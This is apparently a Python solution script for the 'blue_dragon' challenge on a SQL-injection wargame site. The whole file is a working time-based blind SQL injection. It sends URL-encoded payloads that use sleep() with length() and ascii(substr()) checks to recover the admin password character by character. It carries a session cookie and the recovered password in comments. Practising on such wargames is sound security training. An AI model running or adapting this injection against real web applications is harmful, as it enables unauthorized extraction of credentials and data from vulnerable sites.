from requests import Session, request
from time import sleep, time

URL = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"
cookie = {"PHPSESSID": "6flgnknob1pkk0tu6g2cp4rtp7"}

PWLength = 0
FLAG = ""


def getPWLength():
    global PWLength
    req = Session()

    for i in range(1, 100):
        payload = f"?id=&pw=%27%20or%20id=%27admin%27%20and%20if(length(pw)={i},sleep(2),0)%23"
        start = time()
        res = req.get(url=URL + payload, cookies=cookie)
        end = time()
        print(f"[*] {i} :: {end - start}")

        if (end - start) > 2.0:
            PWLength = i
            print(f"[*] FIND !!! ")
            break
    print(f"[*] PW Length :: {PWLength}")
    """
    [*] 8 :: 2.043726921081543
    [*] FIND !!! 
    [*] PW Length :: 8
    """


def getPW():
    global PWLength, FLAG
    req = Session()

    for i in range(1, PWLength + 1):
        for j in range(48, 128):
            payload = f"?id=&pw=%27%20or%20id=%27admin%27%20and%20if(ascii(substr(pw,{i},1))={j},sleep(3),0)%23"
            start = time()
            res = req.get(url=URL + payload, cookies=cookie)
            end = time()
            print(f"[*] {i}/{j} :: {end - start}")

            if (end - start) > 2.0:
                FLAG = FLAG + chr(j)
                print(f"[*] FIND !!! :: {chr(j)}")
                break

    print(f"[*] PW :: {FLAG}")
    """
    [*] PW :: d948b8a0
    """


if __name__ == "__main__":
    getPWLength()
    getPW()
    """
    ?id=admin&pw=d948b8a0
    """